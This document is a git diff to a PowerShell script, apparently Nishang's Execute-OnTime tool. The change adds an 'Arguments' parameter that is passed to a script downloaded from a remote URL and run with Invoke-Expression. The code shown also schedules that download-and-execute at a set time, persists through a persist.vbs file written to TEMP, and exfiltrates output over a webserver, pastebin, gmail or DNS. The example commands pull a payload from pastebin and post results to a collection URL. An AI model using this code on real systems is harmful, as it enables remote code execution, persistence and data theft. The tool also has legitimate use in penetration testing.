@@ -13,6 +13,9 @@ If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility fold
 .PARAMETER PayloadURL
 The URL from where the file would be downloaded.
 
+.PARAMETER Arguments
+Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.
+
 .PARAMETER time
 The Time when the payload will be executed (in 24 hour format e.g. 23:21).
 
@@ -55,10 +58,10 @@ Authoritative Name Server for the domain specified in DomainName. Using it may i
 Usually, you should let the Name Server of target to resolve things for you.
 
 .EXAMPLE
-PS > Execute-OnTime -PayloadURL http://example.com/script.ps1 -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload
+PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload
 
 EXAMPLE
-PS > Execute-OnTime -PayloadURL http://example.com/script.ps1 -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+PS > Execute-OnTime PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 
 Use above when using the payload from non-interactive shells.
 
@@ -87,54 +90,59 @@ https://github.com/samratashok/nishang
         [String]
         $PayloadURL,
 
-        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
-        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
+        [Parameter(Position = 1, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 1, Mandatory = $False, Parametersetname="noexfil")]
         [String]
-        $time,
+        $Arguments = "Out-Null",
 
         [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")]
         [String]
-        $CheckURL,
+        $time,
 
         [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
         [String]
+        $CheckURL,
+
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
         $StopString,
 
 
-        [Parameter(Position = 4, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
         [String]
         $ExfilOption,
 
-        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")] 
+        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")] 
         [String]
         $dev_key = "null",
 
-        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $username = "null",
 
-        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $password = "null",
 
-        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $URL = "null",
       
-        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $DomainName = "null",
 
-        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $AuthNS = "null"   
    
    )
  
  $body = @'
-function Logic-Execute-OnTime ($PayloadURL, $time, $CheckURL, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil)
+function Logic-Execute-OnTime ($PayloadURL, $Arguments, $time, $CheckURL, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil)
 {
     
     while($true)
@@ -148,6 +156,11 @@ function Logic-Execute-OnTime ($PayloadURL, $time, $CheckURL, $StopString, $Exfi
         {
             
             $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
+            # Check for arguments to the downloaded script.
+            if ($Arguments -ne "Out-Null")
+            {
+                $pastevalue = Invoke-Expression $Arguments                   
+            }
             $pastevalue
             $exec++
             if ($exfil -eq $True)
@@ -255,11 +268,11 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     {
         
         $name = "persist.vbs"
-        $options = "Logic-Execute-OnTime $PayloadURL $time $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
+        $options = "Logic-Execute-OnTime $PayloadURL $Arguments $time $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
 
         if ($exfil -eq $True)
         {
-            $options = "Logic-Execute-OnTime $PayloadURL $time $CheckURL $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
+            $options = "Logic-Execute-OnTime $PayloadURL $Arguments $time $CheckURL $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
@@ -291,10 +304,10 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     }
     else
     {
-        $options = "Logic-Execute-OnTime $PayloadURL $time $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
+        $options = "Logic-Execute-OnTime $PayloadURL $Arguments $time $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
         if ($exfil -eq $True)
         {
-            $options = "Logic-Execute-OnTime $PayloadURL $time $CheckURL $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
+            $options = "Logic-Execute-OnTime $PayloadURL $Arguments $time $CheckURL $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
